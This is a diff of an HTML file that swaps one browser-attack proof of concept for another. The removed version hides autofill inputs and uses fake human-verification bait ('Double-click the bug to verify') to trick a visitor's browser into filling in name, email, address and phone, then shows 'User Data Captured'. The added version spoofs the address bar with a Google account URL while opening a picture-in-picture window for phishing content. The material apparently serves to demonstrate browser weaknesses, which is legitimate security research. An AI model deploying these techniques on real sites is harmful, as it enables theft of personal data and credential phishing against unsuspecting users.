@@ -1,87 +1,30 @@
 <style>
-    input {
-        opacity: 0;
-        width: 0.1px;
-        border: none;
-        pointer-events: none;
+    #content {
+        display: none;
     }
-
-    option {
-        all: initial;
-        background-color: black;
-    }
-
-    select {
-        opacity: 0;
-        pointer-events: none;
-        position: absolute;
-        top: -10px;
-        left:225px;
-    }
-
 </style>
 
-<body>
-    <!-- Group 1 -->
-    <div class="input-group">
-        <div>
-            <span id="quest"></span><input id="autofill-data" name="name" autocomplete="name">
-        </div>
+<button id="button">Open PIP</button>
 
-        <input name="email" autocomplete="email">
-        <input name="address-line1" autocomplete="address-line1">
-        <input name="address-line2" autocomplete="address-line2">
-        <input name="city" autocomplete="address-level2">
-        <input name="state" autocomplete="address-level1">
-        <input name="country-name" autocomplete="country-name">
-        <input name="postal-code" autocomplete="postal-code">
-        <input name="tel" autocomplete="tel">
-    </div>
+<div id="content">
+    phishing page content here
+</div>
 
-    <select id="selection">
-        <option>&emsp;&emsp;&emsp;&#128030;&emsp;&emsp;&emsp;</option>
-        <option>&emsp;&emsp;&emsp;&#128031;&emsp;&emsp;&emsp;</option>
-        <option>&emsp;&emsp;&emsp;&#128036;&emsp;&emsp;&emsp;</option>
-        <option>&emsp;&emsp;&emsp;&#128011;&emsp;&emsp;&emsp;</option>
-    </select>
-    <center>
-        <pre id="autofill-result"
-            style="background-color: aquamarine;font-size: 1.5rem;">The site requires human verification to proceed. Click to begin.</pre>
-    </center>
+<script>
+    const pipOpen = async () => {
+        history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
 
-
-    <script>
-        const inputfill = document.getElementById('autofill-data');
-        const selectpicker = document.getElementById('selection');
-        function handleClick() {
-            document.getElementById('autofill-result').textContent = "Double-click the bug to verify";
-            document.getElementById('quest').textContent = "Double-click the bug to verify";
-            selectpicker.showPicker();
-            setTimeout(() => {
-                inputfill.showPicker();
-            }, 100);
-            document.removeEventListener('click', handleClick);
-        }
-
-        document.addEventListener('click', handleClick);
-
-
-        var inputFields = document.querySelectorAll('.input-group input');
-
-        inputFields.forEach(function (inputField) {
-            inputField.addEventListener('input', function () {
-
-                var formData = {};
-
-
-                inputFields.forEach(function (field) {
-                    formData[field.name] = field.value;
-                });
-
-
-                document.getElementById('autofill-result').textContent = JSON.stringify(formData, null, 2);
-                document.getElementById('quest').textContent = "User Data Captured";
-            });
+        const pipWindow = await documentPictureInPicture.requestWindow({
+            width: 330,
+            height: 317
         });
-    </script>
-</body>
+        
+        setTimeout(() => {
+            history.replaceState(null, '', '/');
+        }, 1000);
+
+        pipWindow.document.body.append(content);
+    };
+
+    button.onclick = pipOpen;
+</script>
